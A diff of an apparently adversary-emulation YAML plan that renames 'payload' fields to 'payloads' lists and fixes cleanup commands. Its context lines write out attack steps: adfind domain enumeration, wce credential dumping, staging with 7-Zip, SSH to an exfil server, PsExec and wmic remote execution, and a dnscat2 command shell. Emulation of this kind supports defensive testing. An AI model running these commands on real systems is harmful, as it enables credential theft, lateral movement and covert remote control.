@@ -21,7 +21,8 @@
       cmd:
         command: |
           'adfind.exe -f (objectcategory=person) > ad_users.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -68,7 +69,8 @@
       cmd:
         command: |
           'adfind.exe -f (objectcategory=computer) > ad_computers.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -115,7 +117,8 @@
       cmd:
         command: |
           'adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -163,7 +166,8 @@
       cmd:
         command: |
           'adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -211,7 +215,8 @@
       cmd:
         command: |
           'adfind.exe -gcb -sc trustdmp > ad_subnets.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -259,7 +264,8 @@
       cmd:
         command: |
           'adfind.exe -f (objectcategory=group) > ad_group.txt'
-        payload: adfind.exe
+        payloads: 
+        - adfind.exe
 
   input_arguments:
     adfind_exe:
@@ -342,7 +348,8 @@
       cmd:
         command: |
           wce.exe -w -o wce_creds.txt
-        payload: wce.exe
+        payloads: 
+        - wce.exe
 
   input_arguments:
     output_file:
@@ -380,7 +387,7 @@
     - name: command_prompt
       elevation_required: true
       command: "#{wce_exe} -o #{output_file}"
-      cleanup_command: del "#{output_file}" >null 2>&1
+      cleanup_command: del "#{output_file}" >nul 2>&1
 
 # Phase 1: Collection
 
@@ -399,7 +406,8 @@
       cmd:
         command: |
           7.exe a -mx3 ad.7z ad_*
-        payload: 7.exe
+        payloads: 
+        - 7.exe
 
   input_arguments:
     7_exe:
@@ -449,7 +457,8 @@
       cmd:
         command: |
           putty.exe -ssh #{user}@#{exfil_server}
-        payload: putty.exe
+        payloads: 
+        - putty.exe
 
   input_arguments:
     putty_exe:
@@ -510,7 +519,8 @@
       cmd:
         command: |
           PsExec.exe \\#{remote_host} #{remote_command}
-        payload: PsExec.exe
+        payloads: 
+        - PsExec.exe
 
   input_arguments:
     psexec_exe:
@@ -573,7 +583,7 @@
     - name: command_prompt
       elevation_required: false
       command: wmic /node:"#{node}" process call create "#{process_to_execute}"
-      cleanup_command: wmic /node "#{node}" process where name="#{process_to_execute}" delete >nul 2>&1
+      cleanup_command: wmic /node "#{node}" process where name="#{process_to_execute}" del >nul 2>&1
 
 # Phase 2: Persistence - Point of Sale (POS)
 
@@ -657,7 +667,8 @@
         command: |
           import-module #{file_path}\\dnscat2.ps1
           Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
-        payload: dnscat2.ps1
+        payloads: 
+        - dnscat2.ps1
 
   input_arguments:
     dnscat_ps1:
